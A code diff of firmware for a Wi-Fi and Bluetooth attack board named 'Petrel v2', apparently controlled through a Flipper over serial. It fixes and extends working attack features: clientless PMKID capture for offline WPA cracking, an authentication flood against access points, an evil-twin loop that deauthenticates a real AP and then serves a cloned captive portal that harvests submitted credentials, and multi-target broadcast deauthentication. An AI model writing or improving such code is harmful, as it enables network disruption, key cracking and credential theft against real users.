       if (hsg_target_set && memcmp(ap, hsg_bssid, 6) != 0) return; // bind PMKID to the selected AP
-      for (uint8_t k = 0; k < pmkid_n; k++)
+      uint8_t pn = PMKN_LOAD();
+      for (uint8_t k = 0; k < pn; k++)
         if (!memcmp(pmkids[k].pmkid, kd + i + 6, 16)) return;      // dedupe
-      if (pmkid_n >= PMKID_MAX) return;
-      memcpy(pmkids[pmkid_n].ap, ap, 6);
-      memcpy(pmkids[pmkid_n].sta, sta, 6);
-      memcpy(pmkids[pmkid_n].pmkid, kd + i + 6, 16);
-      pmkid_n++;
+      if (pn >= PMKID_MAX) return;
+      memcpy(pmkids[pn].ap, ap, 6);
+      memcpy(pmkids[pn].sta, sta, 6);
+      memcpy(pmkids[pn].pmkid, kd + i + 6, 16);
+      PMKN_SET((uint8_t)(pn + 1));   // release: record published before the count
       return;
     }
   }
@@ -1210,7 +1315,8 @@ static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
 }
 
 static void pmkid_stream(int ch) {
-  for (uint8_t i = 0; i < pmkid_n; i++) {
+  uint8_t pn = PMKN_LOAD();
+  for (uint8_t i = 0; i < pn; i++) {
     pmkid_t* p = &pmkids[i];
     char ap[13], sta[13], pm[33];
     hex12(p->ap, ap);
@@ -1229,7 +1335,7 @@ static void pmkid_stream(int ch) {
       Serial.println(line); Serial1.println(line);
     }
   }
-  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)pmkid_n);
+  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)PMKN_LOAD());
   Serial.println(fin); Serial1.println(fin);
 }
 
@@ -1249,11 +1355,12 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
   memcpy(auth + 4, bssid, 6);
   memcpy(auth + 10, sta, 6);
   memcpy(auth + 16, bssid, 6);
-  // The auth body is algorithm (u16 LE) at 26 then sequence (u16 LE) at 28. This used to write
-  // 0x01 into the algorithm field, i.e. ask for shared-key authentication with a zero sequence -
-  // which is not what an open network expects, so the AP should have rejected it (and many do).
-  auth[26] = 0x00; auth[27] = 0x00;   // auth algorithm: open system
-  auth[28] = 0x01; auth[29] = 0x00;   // auth sequence: 1
+  // The management header is 24 bytes, so the auth body starts at 24: algorithm (u16 LE) at 24,
+  // transaction sequence at 26, status at 28. Writing them at 26/28 left the sequence zero and put
+  // the value in the status field, which an AP rejects.
+  auth[24] = 0x00; auth[25] = 0x00;   // auth algorithm: open system
+  auth[26] = 0x01; auth[27] = 0x00;   // auth transaction sequence: 1
+  auth[28] = 0x00; auth[29] = 0x00;   // status: 0
   wifi_tx_raw_frame(auth, 30);
   delay(30);
   // Association request (ESS + Privacy, SSID + rates + RSN WPA2-PSK/CCMP)
@@ -1289,9 +1396,7 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
 // Measured after moving the tune inside the loop: 64 beacons on channel 36 complete and the board
 // stays up, so 5 GHz raw TX works and 5 GHz targets are allowed.
 static bool tx_raw_chan_ok(int ch, const char* who) {
-  // Valid TX channels are 1-14 (2.4 GHz) and the non-DFS 5 GHz sets 36-48 / 149-165. The old
-  // "1..165 minus DFS" also accepted 15-35, which are not real channels.
-  if((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165)) return true;
+  if(is_valid_tx_channel(ch)) return true;
   String r = String("ERROR: ") + who + " refused: channel " + String(ch) +
              (is_dfs_channel(ch) ? " is DFS (radar, RX only)" : " is not 1-14 / 36-48 / 149-165");
   Serial.println(r); Serial1.println(r);
@@ -1356,8 +1461,8 @@ static void sae_send_commit(const uint8_t* bssid, const uint8_t* sta) {
 // APs allocate an AID before checking that the authentication really happened, and the null-data
 // frame with the power-management bit set then tells the AP the fake client is dozing, which is
 // what keeps its entry from being reaped. Only the AP is addressed - no frames go to any client.
-// (Flood frame layout follows pmkid_clientless() below, but with the auth algorithm/sequence in
-// their correct slots: algorithm 0x0000 = open system at offset 26, seq 1 at offset 28.)
+// (Auth body layout: algorithm 0x0000 = open system at 24, transaction sequence 1 at 26, status 0
+// at 28 - the fields start immediately after the 24-byte management header.)
 static uint8_t flood_sta[6];
 
 static void flood_mac_rand(void) {
@@ -1372,8 +1477,9 @@ static void flood_tx_auth(const uint8_t* bssid, const uint8_t* sta) {
   memcpy(f + 4, bssid, 6);                  // addr1: the AP
   memcpy(f + 10, sta, 6);                   // addr2: the spoofed client
   memcpy(f + 16, bssid, 6);                 // addr3: BSSID
-  f[26] = 0x00; f[27] = 0x00;               // auth algorithm: open system
-  f[28] = 0x01; f[29] = 0x00;               // auth sequence: 1
+  f[24] = 0x00; f[25] = 0x00;               // auth algorithm: open system
+  f[26] = 0x01; f[27] = 0x00;               // auth transaction sequence: 1
+  f[28] = 0x00; f[29] = 0x00;               // status: 0
   wifi_tx_raw_frame(f, 30);
 }
 
@@ -1442,9 +1548,39 @@ static volatile uint8_t dauth_n = 0;
 static volatile bool dauth_run = false;
 static uint8_t dauth_idx = 0;
 
-static void hex_to_mac(const String& h, uint8_t* out) {
-  for (int i = 0; i < 6; i++)
-    out[i] = (uint8_t)strtoul(h.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
+// Strict MAC parsing: strtoul() alone accepted garbage and returned 0, so "ZZ:..." silently
+// became 00:00:... and a short string left the tail of the destination stale.
+static bool hex2(const char* s, uint8_t* out) {
+  int hi = hexnib(s[0]), lo = hexnib(s[1]);
+  if (hi < 0 || lo < 0) return false;
+  *out = (uint8_t)((hi << 4) | lo);
+  return true;
+}
+
+static bool hex_to_mac(const String& h, uint8_t* out) {   // "aabbccddeeff"
+  if (h.length() != 12) return false;
+  const char* p = h.c_str();
+  for (int i = 0; i < 6; i++) if (!hex2(p + i * 2, out + i)) return false;
+  return true;
+}
+
+// A command argument that must be a decimal index. Missing/non-numeric used to become 0, which
+// silently acted on AP 0.
+static bool arg_index(const String& line, int from, int* out) {
+  String t = line.substring(from); t.trim();
+  if (t.length() == 0 || t.length() > 4) return false;
+  for (unsigned i = 0; i < t.length(); i++) if (!isdigit((unsigned char)t[i])) return false;
+  *out = t.toInt();
+  return true;
+}
+
+static bool parse_mac_colon(const char* s, uint8_t* out) {   // "AA:BB:CC:DD:EE:FF"
+  if (strlen(s) != 17) return false;
+  for (int i = 0; i < 6; i++) {
+    if (!hex2(s + i * 3, out + i)) return false;
+    if (i < 5 && s[i * 3 + 2] != ':') return false;
+  }
+  return true;
 }
 
 static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_client, uint8_t ch) {
@@ -1473,7 +1609,9 @@ static volatile uint32_t hsg_cap_ms = 15000;
 static volatile bool hsg_pmkid = false;
 static volatile int hsg_ch = 6;
 // B: async passive CAPTURE (armed by CAPTURE, finished by loop() or CAPSTOP).
-static volatile bool cap_active = false;
+static bool cap_active = false;   // cross-task: atomic accessors below
+#define CAP_ON()   __atomic_load_n(&cap_active, __ATOMIC_ACQUIRE)
+#define CAP_SET(v) __atomic_store_n(&cap_active, (v), __ATOMIC_RELEASE)
 static volatile uint32_t cap_deadline = 0;
 static volatile int cap_ch = 6;
 
@@ -1485,15 +1623,22 @@ static volatile int cap_ch = 6;
 static volatile bool hsg_dry = false;
 static void hsg_start(const uint8_t* bssid, int ch, uint32_t cap_ms, bool pmkid, bool dry) {
     if (apActive) destroyAP();   // no monitor capture while the softAP runs
-    hs_count = 0;
-    pmkid_n = 0;
+    // A repeated grab must not reset the buffers under the previous callback: quiesce first.
+    wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+    HSCAP_SET(false);
+    HSCOUNT_SET(0);
+    // Discovery must look at THIS AP's stations. A leftover STASCAN filter used to restrict it to
+    // the wrong AP, and no filter at all collected every AP's stations on the channel.
+    memcpy(sta_filter, bssid, 6);
+    STAF_SET(true);
+    PMKN_SET(0);
     memcpy(hsg_bssid, bssid, 6);
     hsg_target_set = true;   // grab is pinned to this AP -> promisc callbacks filter to it
     hsg_ch = ch;
     hsg_cap_ms = cap_ms;
     hsg_pmkid = pmkid;
     hsg_dry = dry;
-    sta_n = 0;
+    STA_STORE(0);
     wext_set_channel(WLAN0_NAME, ch);
     wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
     hsg_t = millis();
@@ -1540,7 +1685,7 @@ static void hv_stop(const char* why) {
     hv_targets_left = 0;
     if (hsg_phase != HSG_IDLE) {   // abort any in-flight grab + free the radio (mirrors STOP)
         wifi_set_promisc(0, NULL, 0);
-        hs_cap = false;
+        HSCAP_SET(false);
         hsg_phase = HSG_IDLE;
         hsg_target_set = false;
     }
@@ -1556,7 +1701,9 @@ static char ble_name[BLE_MAX][24];
 static char ble_tag[BLE_MAX][12];
 static char ble_raw[BLE_MAX][64];   // raw advertising data as hex
 static int8_t ble_rssi[BLE_MAX];
-static volatile uint8_t ble_n = 0;
+static uint8_t ble_n = 0;   // cross-task: atomic accessors below
+#define BLEN_LOAD()  __atomic_load_n(&ble_n, __ATOMIC_ACQUIRE)
+#define BLEN_SET(v)  __atomic_store_n(&ble_n, (v), __ATOMIC_RELEASE)
 static BLEAdvertData ble_adv;
 static BLEHIDKeyboard ble_kbd;
 static BLEAdvertData ble_hidadv;
@@ -1594,7 +1741,8 @@ static void ble_scan_cb(T_LE_CB_DATA* p_data) {
   char raw[64]; int rp = 0;
   for(uint8_t k = 0; k < dl && rp < 60; k++) rp += snprintf(raw + rp, 3, "%02x", si->data[k]);
   raw[rp] = '\0';
-  for (uint8_t i = 0; i < ble_n; i++) {
+  uint8_t bn = BLEN_LOAD();
+  for (uint8_t i = 0; i < bn; i++) {
     if (strcmp(ble_addr[i], as) == 0) {          // already seen -> refresh name/tag/rssi/raw
       ble_rssi[i] = ble_adv.getRSSI();
       strncpy(ble_raw[i], raw, sizeof(ble_raw[0]) - 1);
@@ -1607,28 +1755,29 @@ static void ble_scan_cb(T_LE_CB_DATA* p_data) {
       return;
     }
   }
-  if (ble_n >= BLE_MAX) return;
-  snprintf(ble_addr[ble_n], sizeof(ble_addr[0]), "%s", as);
-  ble_name[ble_n][0] = '\0';
+  if (bn >= BLE_MAX) return;
+  snprintf(ble_addr[bn], sizeof(ble_addr[0]), "%s", as);
+  ble_name[bn][0] = '\0';
   if (ble_adv.hasName()) {
-    strncpy(ble_name[ble_n], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
-    ble_name[ble_n][sizeof(ble_name[0]) - 1] = '\0';
+    strncpy(ble_name[bn], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
+    ble_name[bn][sizeof(ble_name[0]) - 1] = '\0';
   }
-  strncpy(ble_tag[ble_n], tag, sizeof(ble_tag[0]) - 1);
-  ble_tag[ble_n][sizeof(ble_tag[0]) - 1] = '\0';
-  strncpy(ble_raw[ble_n], raw, sizeof(ble_raw[0]) - 1);
-  ble_raw[ble_n][sizeof(ble_raw[0]) - 1] = '\0';
-  ble_rssi[ble_n] = ble_adv.getRSSI();
-  ble_n++;
+  strncpy(ble_tag[bn], tag, sizeof(ble_tag[0]) - 1);
+  ble_tag[bn][sizeof(ble_tag[0]) - 1] = '\0';
+  strncpy(ble_raw[bn], raw, sizeof(ble_raw[0]) - 1);
+  ble_raw[bn][sizeof(ble_raw[0]) - 1] = '\0';
+  ble_rssi[bn] = ble_adv.getRSSI();
+  BLEN_SET((uint8_t)(bn + 1));   // release: record published before the count
 }
 
 static void ble_stream() {
-  for (uint8_t i = 0; i < ble_n; i++) {
+  uint8_t bn = BLEN_LOAD();
+  for (uint8_t i = 0; i < bn; i++) {
     char line[160];
     snprintf(line, sizeof(line), "BLE:%s|%d|%s|%s|%s", ble_addr[i], ble_rssi[i], ble_name[i], ble_tag[i], ble_raw[i]);
     Serial.println(line); Serial1.println(line);
   }
-  String fin = "BLEDONE: n=" + String((unsigned)ble_n);
+  String fin = "BLEDONE: n=" + String((unsigned)bn);
   Serial.println(fin); Serial1.println(fin);
 }
 
@@ -1861,10 +2010,10 @@ static bool atStart(int ch = 6, const char* apssid = nullptr, bool portal = fals
      * coexists with the AP (that is exactly the EVIL flow: deauth the real AP, host its clone).
      * dauth_run (DEAUTHRUN) is excluded because it retunes the channel round-robin.
      */
-    if (hopping || cap_active || hsg_phase != HSG_IDLE || hv_phase != HV_IDLE || wids_on ||
-        et_phase != ET_IDLE ||
+    if (hopping || CAP_ON() || hsg_phase != HSG_IDLE || hv_phase != HV_IDLE || wids_on ||
+        SNIFF_ON() || et_phase != ET_IDLE ||
         dauth_run ||
-        karma_on || randomSSID || rickroll || ghostSpam ||
+        KON_LOAD() || randomSSID || rickroll || ghostSpam ||
         ssid.length() != 0) {
         atReply("APTEST:BUSY");
         return false;
@@ -1881,11 +2030,8 @@ static bool atStart(int ch = 6, const char* apssid = nullptr, bool portal = fals
     } else {
         memcpy(atSsid, "PETRELTESTAP", sizeof("PETRELTESTAP"));
     }
-    // 2.4 (1-14) or non-DFS 5 GHz (36-48 / 149-165); anything else (incl DFS) uses the ch6 default.
-    if ((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165))
-        atChannel = (uint8_t)ch;
-    else
-        atChannel = 6;
+    // A real TX channel, else the ch6 default (DFS included: an AP cannot sit on radar channels).
+    atChannel = is_valid_tx_channel(ch) ? (uint8_t)ch : 6;
     // Create AP serves the selected captive portal via the raw-lwIP listener; the bare test AP serves
     // the read-only status page via the raw-lwIP WebUI. The Arduino WiFiServer is not used at all, so
     // the "[ERROR] Accept connection failed" flood is gone. Set per start; the next start overwrites
@@ -1947,7 +2093,7 @@ static bool atStartClone(const char* ssid, int ch) {
     // target's own channel: 2.4 (1-14) or non-DFS 5 GHz (36-48 / 149-165). DFS (52-144) can't host
     // an AP, so it is REFUSED loudly rather than silently retuned to ch6 (a silent fallback used to
     // hide the band failure). The deauth leg uses et_ch directly regardless of the clone channel.
-    if ((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165)) {
+    if (is_valid_tx_channel(ch)) {
         atChannel = (uint8_t)ch;
     } else {
         Serial.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
@@ -1956,6 +2102,7 @@ static bool atStartClone(const char* ssid, int ch) {
     }
     webui_mode = false;   // eviltwin serves the captive portal, never the WebUI status page (AT_HTTP
                           // checks webui_mode first, so a stale true from a prior APTEST/WEBUI would win)
+    build_portal_urls(ssid);   // opt-114 / 302 / cp.json host must match the CLONE ssid, not the last AP
     ++atCycle;
     atFailure = 0;
     atOffTries = 0;
@@ -1975,8 +2122,87 @@ static void releaseRadio(const char* why) {
     et_phase = ET_IDLE;
     et_live = false;
     web_portal_mode = false;                 // stop serving the captive portal via raw-lwIP
+    webui_mode = false;                      // ...and the status page, whichever was up
     char m[56]; snprintf(m, sizeof(m), "EVILTWIN:released %s", why ? why : "");
     Serial.println(m); Serial1.println(m);
+}
+
+// --- background ticks that must keep running while the AP lifecycle owns the radio -------------
+// loop() used to `return` as soon as atOwned() was true, which starved both of these: EVILTWIN LIVE
+// could never observe AT_READY (so it never reached its portal dwell or its deadline) and EVIL's
+// deauth list never transmitted a single frame.
+
+// M3 evil-twin FSM tick. Non-blocking (returns each pass). DEAUTH and PORTAL are strictly sequential
+// (one radio). DRY only cycles + logs "would ..."; LIVE drives the AP lifecycle, with a hard deadline
+// on bring-up/teardown so a stuck SDK call cannot wedge loop().
+static void eviltwinTick() {
+  if (et_phase == ET_IDLE) return;
+  uint32_t now = millis();
+  if (et_phase == ET_DEAUTH) {
+    if (et_live && !is_dfs_channel(et_ch)) {        // AP is down here: burst-deauth the real AP
+      wext_set_channel(WLAN0_NAME, et_ch);
+      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+        wifi_tx_deauth_frame(et_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+        delay(5);
+      }
+    }
+    if (now - et_t >= ET_BURST_MS) {
+      et_t = now;
+      if (et_live) {
+        if (atStartClone(et_ssid, et_ch)) et_phase = ET_WAITUP;
+        else releaseRadio("clone start refused");
+      } else {
+        char m[96];
+        snprintf(m, sizeof(m), "EVILTWIN:would clone \"%s\" ch%d + portal (dwell %us)",
+                 et_ssid, et_ch, (unsigned)(ET_DWELL_MS / 1000u));
+        Serial.println(m); Serial1.println(m);
+        et_phase = ET_PORTAL;
+      }
+    }
+  } else if (et_phase == ET_WAITUP) {               // LIVE: clone AP coming up
+    if (atState == AT_READY) { et_t = now; et_phase = ET_PORTAL; Serial1.println("EVILTWIN:clone up"); }
+    else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP bring-up timeout");
+  } else if (et_phase == ET_PORTAL) {
+    if (now - et_t >= ET_DWELL_MS) {
+      et_t = now;
+      if (et_live) { atStop(); et_phase = ET_WAITDN; }
+      else {
+        char m[88];
+        snprintf(m, sizeof(m), "EVILTWIN:would deauth %02X%02X%02X%02X%02X%02X ch%d (next cycle)",
+                 et_bssid[0], et_bssid[1], et_bssid[2], et_bssid[3], et_bssid[4], et_bssid[5], et_ch);
+        Serial.println(m); Serial1.println(m);
+        et_phase = ET_DEAUTH;
+      }
+    }
+  } else if (et_phase == ET_WAITDN) {               // LIVE: AP tearing down before next deauth
+    if (atState == AT_IDLE) { et_t = now; et_phase = ET_DEAUTH; }
+    else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP teardown timeout");
+  }
+}
+
+// C: multi-target deauth round-robin (DEAUTH / DEAUTHRUN). `apOwned` = the AP lifecycle holds the
+// radio: then only targets sitting on the AP's own channel are sent, WITHOUT retuning (a retune
+// would move the AP off its channel). Otherwise every target is retuned to in turn.
+static void deauthListTick(bool apOwned) {
+  if (deauth_wifis.size() == 0) return;
+  // The list can shrink under us (STOP <n>, SCAN, DEAUTHCLEAR), so clamp before dereferencing.
+  if (current_num >= deauth_wifis.size()) current_num = 0;
+  int idx = deauth_wifis[current_num];
+  if (idx < 0 || idx >= (int)scan_results.size()) { current_num = 0; return; }
+  int ch = scan_results[idx].channel;
+  current_num++;
+  if (current_num >= deauth_wifis.size()) current_num = 0;
+  if (apOwned && ch != atChannel) return;   // off-channel target: skip, try the next one
+  if (is_dfs_channel(ch)) return;           // DFS: RX-only
+  memcpy(deauth_bssid, scan_results[idx].bssid, 6);
+  if (!apOwned) wext_set_channel(WLAN0_NAME, ch);
+  led_w(LED_R, HIGH);
+  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+    delay(5);
+  }
+  led_w(LED_R, LOW);
+  delay(50);
 }
 
 // M4: render the read-only WebUI status page (live in-RAM state) into b. Reads only; no control.
@@ -1997,8 +2223,9 @@ static void webui_render(char* b, size_t n) {
       "</table><p style='color:#888'>read-only &middot; Petrel v2</p></body></html>",
       (unsigned long)xPortGetFreeHeapSize(),
       (unsigned)scan_results.size(),
-      sniff_stream ? "on" : "off",
-      wids_on ? "on" : "off", wids_ch, (unsigned long)g_wids.seen_frames,
+      SNIFF_ON() ? "on" : "off",
+      wids_on ? "on" : "off", wids_ch,
+      (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED),
       hv_phase, hv_targets_left,
       et_phase, et_live ? "LIVE" : "DRY");
 }
@@ -2028,13 +2255,43 @@ static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, boo
 }
 
 // Portal rotation (PORTALROT 1): advance to the next page after every credential submit. Runs in the
-// tcpip thread, so it only rewrites the stable Default buffer and swaps the served pointer.
+// tcpip thread, so it only bumps the index - web_lwip re-resolves on the next idle request.
 static void portal_rotate_now(void) {
   if (!portal_rot) return;
-  portal = (portal + 1) % 6;   // 0..5: Custom (6) is the operator's own page, never rotated away
-  const char* b; int l; bool g, c;
-  resolve_eviltwin_portal(&b, &l, &g, &c);
-  web_lwip_set_portal(b, l, g, c);
+  if (portal != Custom) portal = (portal + 1) % 6;   // Custom is the operator's own page
+}
+
+// customPortal is read by the tcpip thread while a page is being resolved, so every mutation runs
+// there too (web_lwip_portal_edit blocks until it has actually been applied).
+static uint16_t portalAdded = 0;
+
+static void portal_append_cb(const void* arg) {
+  const char* h = (const char*)arg;
+  portalAdded = 0;
+  for (int i = 0; h && h[i] && h[i+1] && customPortalLen < sizeof(customPortal) - 1; i += 2) {
+    int hi = hexnib(h[i]);
+    int lo = hexnib(h[i+1]);
+    if (hi < 0 || lo < 0) break;
+    customPortal[customPortalLen++] = (char)((hi << 4) | lo);
+    portalAdded++;
+  }
+  customPortal[customPortalLen] = 0;
+}
+
+static void portal_clear_cb(const void* arg) { (void)arg; customPortalLen = 0; customPortal[0] = 0; }
+
+// `portal` and `portal_rot` are read by the tcpip rotation callback, so the host commands write them
+// there too instead of racing it from loop().
+static void portal_select_cb(const void* arg) { portal = *(const int*)arg; }
+static void portal_read_cb(const void* arg) { *(int*)arg = portal; }   // snapshot for status reads
+static void portal_rot_cb(const void* arg) { portal_rot = (*(const int*)arg) != 0; }
+
+static unsigned long portalHash = 0;
+static void portal_hash_cb(const void* arg) {
+  (void)arg;
+  unsigned long h = 2166136261UL;
+  for (unsigned int i = 0; i < customPortalLen; i++) { h ^= (uint8_t)customPortal[i]; h *= 16777619UL; }
+  portalHash = h;
 }
 
 static void apTestTick()
@@ -2196,7 +2453,7 @@ static void apTestTick()
         return;
 
     case AT_DHCP:
-        if (!start_DHCP_Server("http://192.168.4.1/cp.json", 0))
+        if (!start_DHCP_Server(cpUri, 0))   // derived from the AP SSID, same host as the 302/cp.json
             atFail(7);
         else
             atEnter(AT_DNS);
@@ -2216,10 +2473,11 @@ static void apTestTick()
             // Captive portal (Create AP / evil-twin clone): same raw-lwIP listener, serving the
             // SELECTED portal page (Default/brand/Custom per the `portal` global) + OS-probe
             // redirects, and capturing submitted credentials.
-            const char* pb; int pl; bool pg, pc;
-            resolve_eviltwin_portal(&pb, &pl, &pg, &pc);
+            // The listener resolves the page per request (see web_lwip.h), so rotation never swaps
+            // a buffer out from under an in-flight send.
+            web_lwip_set_resolver(resolve_eviltwin_portal);
             web_lwip_set_rotate(portal_rotate_now);
-            if (!web_lwip_start_portal(pb, pl, pg, pc)) { atFail(9); return; }
+            if (!web_lwip_start_portal()) { atFail(9); return; }
         }
         status = WL_CONNECTED;
         apActive = true;             // confirmation AND all services succeeded
@@ -2236,8 +2494,8 @@ static void apTestTick()
  * lifecycle refused (busy). */
 bool createAP(char *ssid, char *ch, char *)
 {
-    build_portal_urls(ssid);
-    webui_mode = false;
+    // No side effects before atStart(): it sets webui_mode itself and the caller publishes the
+    // portal URLs only once the request was accepted.
     return atStart(atoi(ch), ssid, /*portal=*/true);
 }
 
@@ -2256,17 +2514,51 @@ void loop() {
   if (wids_on) wids_drain();   // M3: emit queued WIDS alerts (cb cannot touch Serial)
   if (web_portal_mode) {   // drain captive-portal credentials captured in the lwIP recv thread
     char ev[128];
-    if (web_lwip_poll_creds(ev, sizeof(ev))) { Serial.print("EV:"); Serial.println(ev);
-                                               Serial1.print("EV:"); Serial1.println(ev); }
+    while (web_lwip_poll_creds(ev, sizeof(ev))) { Serial.print("EV:"); Serial.println(ev);
+                                                  Serial1.print("EV:"); Serial1.println(ev); }
+    static unsigned ev_drop = 0;
+    unsigned d = web_lwip_creds_dropped();
+    if (d != ev_drop) {   // a submission lost to a full queue must be visible
+      ev_drop = d;
+      Serial.print("EV:dropped "); Serial.println(d);
+      Serial1.print("EV:dropped "); Serial1.println(d);
+    }
   }
   {   // drain the lwIP-thread log (DHCP/DNS): the tcpip thread must not write the UART itself
     char ll[96];
     while (lwip_log_poll(ll, sizeof(ll))) { Serial.println(ll); Serial1.println(ll); }
+    static unsigned last_drop = 0;
+    unsigned d = lwip_log_dropped();
+    if (d != last_drop) {   // an overrun must be visible, not silent
+      last_drop = d;
+      Serial.print("LWIPLOG:dropped "); Serial.println(d);
+      Serial1.print("LWIPLOG:dropped "); Serial1.println(d);
+    }
   }
   // Drain each UART fast (no per-char delay) so long chunked lines aren't dropped, into its OWN
   // buffer.
-  while (Serial1.available()) { cmdFlip += (char)Serial1.read(); }
-  while (Serial.available())   { cmdUsb  += (char)Serial.read(); }
+  // SELF-HEAL (2026-10-28): the Flipper supplies the 5V, and a Flipper reboot glitches the UART
+  // lines badly enough that this board's Serial1 RX stops delivering bytes until the peripheral is
+  // re-armed — the host then sees a board that never answers IDENT or SCAN:OK, and only a board
+  // reset fixes it. Re-arm Serial1 after a long quiet period; an in-flight line is never torn down
+  // because the re-init only runs when nothing has arrived for LINK_QUIET_MS.
+  bool got_rx = false;
+  while (Serial1.available()) { cmdFlip += (char)Serial1.read(); got_rx = true; }
+  while (Serial.available())   { cmdUsb  += (char)Serial.read(); got_rx = true; }
+  {
+    static uint32_t link_last_rx = 0;
+    static bool link_rearmed = false;
+    uint32_t nowm = millis();
+    if(got_rx) {
+      link_last_rx = nowm;
+      link_rearmed = false;
+    } else if(!link_rearmed && (nowm - link_last_rx) > 10000u) {
+      link_rearmed = true;
+      Serial1.end();
+      Serial1.begin(BAUD);
+      Serial.println("LINK:Serial1 re-armed after idle");
+    }
+  }
   // Process EVERY complete line, in order, from both sources (USB first: the out-of-band control
   // channel). The old code ran the chain only when the whole accumulated buffer ended in '\n' and
   // then cleared all of it, so two commands delivered in the same loop() pass silently lost the
@@ -2319,7 +2611,7 @@ void loop() {
         // M0.2: while a binary sniff stream is armed, the CH340 bulk channel carries ONLY
         // DP_FRAME. Honour just SNIFF STOP / PING; refuse everything else and reply on Serial1
         // (control) so no ASCII ever lands on the stream the host is decoding.
-        if (sniff_stream && command != "SNIFF STOP" && command != "PING") {
+        if (SNIFF_ON() && command != "SNIFF STOP" && command != "PING" && !command.startsWith("STOP")) {
             Serial1.println("ERROR:SNIFF owns radio");
             readString = "";
             continue;
@@ -2327,24 +2619,44 @@ void loop() {
 
         // M2: while the autonomous harvest owns the radio, honour only HARVEST */PING; other radio
         // commands would collide (single radio). Reply on Serial1 (control) only.
-        if (hv_phase != HV_IDLE && !command.startsWith("HARVEST") && command != "PING") {
+        if (hv_phase != HV_IDLE && !command.startsWith("HARVEST") && command != "PING" &&
+            !command.startsWith("STOP")) {
             Serial1.println("ERROR:HARVEST owns radio");
             readString = "";
             continue;
         }
 
         // M3: while WIDS monitors (listen-only), only WIDS */PING are honoured (single radio).
-        if (wids_on && !command.startsWith("WIDS") && command != "PING") {
+        if (wids_on && !command.startsWith("WIDS") && command != "PING" && !command.startsWith("STOP")) {
             Serial1.println("ERROR:WIDS owns radio");
             readString = "";
             continue;
         }
 
         // M3: while the evil-twin FSM runs, only EVILTWIN */PING are honoured (single radio).
-        if (et_phase != ET_IDLE && !command.startsWith("EVILTWIN") && command != "PING") {
+        if (et_phase != ET_IDLE && !command.startsWith("EVILTWIN") && command != "PING" &&
+            !command.startsWith("STOP")) {
             Serial1.println("ERROR:EVILTWIN owns radio");
             readString = "";
             continue;
+        }
+
+        // Capture, a grab and KARMA own the receiver just like the lifecycle does. Only the CURRENT
+        // owner's own commands (plus STOP/PING) may pass: letting any owner's commands through
+        // meant CAPTURE could replace an active grab's callback while its FSM kept running.
+        {
+            bool capOwn = CAP_ON(), grabOwn = (hsg_phase != HSG_IDLE), karmaOwn = KON_LOAD();
+            if ((capOwn || grabOwn || karmaOwn) && command != "PING" && !command.startsWith("STOP")) {
+                bool mine = (capOwn && (command.startsWith("CAPTURE") || command.startsWith("CAPSTOP")))
+                         || (grabOwn && (command.startsWith("HSGRAB") || command.startsWith("PKGRAB") ||
+                                         command.startsWith("PMKID")))
+                         || (karmaOwn && (command.startsWith("KARMA") || command.startsWith("TRAP")));
+                if (!mine) {
+                    Serial1.println("ERROR:CAPTURE owns radio");
+                    readString = "";
+                    continue;
+                }
+            }
         }
 
         /*
@@ -2394,9 +2706,22 @@ void loop() {
       
     }else if(readString.substring(0,4)=="STOP"){
       DEBUG_SER_PRINT("Stop deauthing\n");
+      if (et_phase != ET_IDLE) releaseRadio("by STOP");   // bare STOP also ends the evil-twin cycle
       dauth_run = false;   // C: also disarm the multi-target deauth list
       dauth_n = 0;
-      if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
+      hopping = false;     // STOP used to leave the hop tick retuning the radio
+      // An active grab is NOT cap_active, so it needs its own check: abandoning the FSM without
+      // stopping promisc left the callback running and the capture armed.
+      if (CAP_ON() || hsg_phase != HSG_IDLE || KON_LOAD() || SNIFF_ON() || wids_on ||
+          hv_phase != HV_IDLE) {
+        wifi_set_promisc(0, NULL, 0);
+        HSCAP_SET(false);
+        CAP_SET(false);
+        KON_STORE(false);   // bare STOP releases every receiver owner
+        SNIFF_SET(false);
+        wids_on = false;
+        hv_phase = HV_IDLE;
+      }
       hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
       hsg_target_set = false;
       ghostSpam = false;
@@ -2405,10 +2730,10 @@ void loop() {
       // "STOP <n>" removes one target and leaves the AP running (that is the info screen's toggle);
       // a bare "STOP", or an out-of-range index, tears everything down. The old code only honoured
       // the per-target form while no AP was up, so the toggle was dead once the clone was running.
-      bool perTarget = (readString.length() > 5);
+      int numStation = 0;
+      bool perTarget = arg_index(readString, 5, &numStation);
       if(perTarget){
-        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
-        if(numStation < scan_results.size()){
+        if(numStation < (int)scan_results.size()){
           wifis_temp.clear();
           unsigned int num_st_tmp;
 
@@ -2456,10 +2781,11 @@ void loop() {
       char apssid[33];
       String ap_ssid = readString.substring(8); ap_ssid.trim();
       ap_ssid.toCharArray(apssid, 33);
